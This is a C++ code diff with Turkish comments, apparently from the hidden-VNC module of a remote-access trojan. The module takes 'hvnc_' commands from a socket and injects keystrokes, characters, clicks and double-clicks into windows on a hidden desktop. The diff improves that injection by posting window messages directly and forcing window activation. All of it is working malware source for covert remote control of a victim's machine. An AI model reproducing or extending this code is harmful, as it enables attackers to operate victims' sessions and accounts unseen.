@@ -354,22 +354,20 @@ static HWND find_window_at(POINT screenPt) {
 }
 
 // -----------------------------------------------------------------------
-//  Klavye: Yeni yöntem – SendInput ile sistem seviyesinde tuş gönderimi
-//  Bu yöntem WM_CHAR dahil tüm mesajların otomatik üretilmesini sağlar.
+//  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
-static void SimulateKeyEvent(int vk, bool isDown) {
-    INPUT input = {};
-    input.type = INPUT_KEYBOARD;
-    input.ki.wVk = vk;
-    input.ki.wScan = 0;
-    input.ki.dwFlags = isDown ? 0 : KEYEVENTF_KEYUP;
-    input.ki.time = 0;
-    input.ki.dwExtraInfo = 0;
-    SendInput(1, &input, sizeof(INPUT));
+static HWND GetFocusedWindow() {
+    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
+    HWND foreground = GetForegroundWindow();
+    DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
+    if (GetGUIThreadInfo(threadId, &gti) && gti.hwndFocus) {
+        return gti.hwndFocus;
+    }
+    return foreground;
 }
 
 // -----------------------------------------------------------------------
-//  input_loop – Klavye kısmı SendInput ile değiştirildi
+//  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
 // -----------------------------------------------------------------------
 static void input_loop() {
     ensure_desktop();
@@ -390,17 +388,23 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup") {
-            int vk    = cmd.value("keycode", 0);
-            bool down = (action == "hvnc_keydown");
+        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+            int vk = cmd.value("keycode", 0);
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget) continue;
 
-            // SendInput doğrudan aktif pencereye yönlendirir, ek odak ayarı gerekmez
-            SimulateKeyEvent(vk, down);
+            if (action == "hvnc_keydown") {
+                PostMessageW(hTarget, WM_KEYDOWN, vk, 0);
+            } else if (action == "hvnc_keyup") {
+                PostMessageW(hTarget, WM_KEYUP, vk, 0);
+            } else if (action == "hvnc_char") {
+                PostMessageW(hTarget, WM_CHAR, vk, 0);
+            }
             continue;
         }
 
         // ---- Mouse ----
-        if (action.find("hvnc_mouse") == string::npos) continue;
+        if (action.find("hvnc_mouse") == string::npos && action != "hvnc_doubleclick") continue;
 
         int normX = cmd.value("x", 0);
         int normY = cmd.value("y", 0);
@@ -464,8 +468,10 @@ static void input_loop() {
             HWND hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
 
+            SendMessageW(hwnd, WM_MOUSEACTIVATE, (WPARAM)hwnd, MAKELPARAM(HTCLIENT, WM_LBUTTONDOWN));
             SetForegroundWindow(hwnd);
             SetFocus(hwnd);
+            SendMessageW(hwnd, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hwnd);
 
             LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0,
                                       MAKELPARAM(screenPt.x, screenPt.y));
@@ -540,6 +546,31 @@ static void input_loop() {
             }
             continue;
         }
+
+        if (action == "hvnc_doubleclick") {
+            int btn = cmd.value("button", 0);
+            HWND hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) continue;
+
+            SendMessageW(hwnd, WM_MOUSEACTIVATE, (WPARAM)hwnd, MAKELPARAM(HTCLIENT, WM_LBUTTONDBLCLK));
+            SetForegroundWindow(hwnd);
+            SetFocus(hwnd);
+            SendMessageW(hwnd, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hwnd);
+
+            LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y));
+            if (ht == HTCLIENT) {
+                HWND hTarget = hwnd;
+                HWND hChild = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
+                if (hChild && hChild != hwnd) hTarget = hChild;
+
+                POINT clientPt = screenPt;
+                ScreenToClient(hTarget, &clientPt);
+
+                UINT msg = (btn == 0) ? WM_LBUTTONDBLCLK : (btn == 1 ? WM_RBUTTONDBLCLK : WM_MBUTTONDBLCLK);
+                PostMessageW(hTarget, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
+            }
+            continue;
+        }
     }
 }
 
@@ -608,7 +639,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 send_error("Failed to start process. Error: " + to_string(GetLastError()));
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
-                   action.find("hvnc_key")   != string::npos) {
+                   action.find("hvnc_key")   != string::npos ||
+                   action == "hvnc_char" ||
+                   action == "hvnc_doubleclick") {
             lock_guard<mutex> lock(g_inputMutex);
             g_inputQueue.push({action, cmd});
             g_inputCV.notify_one();
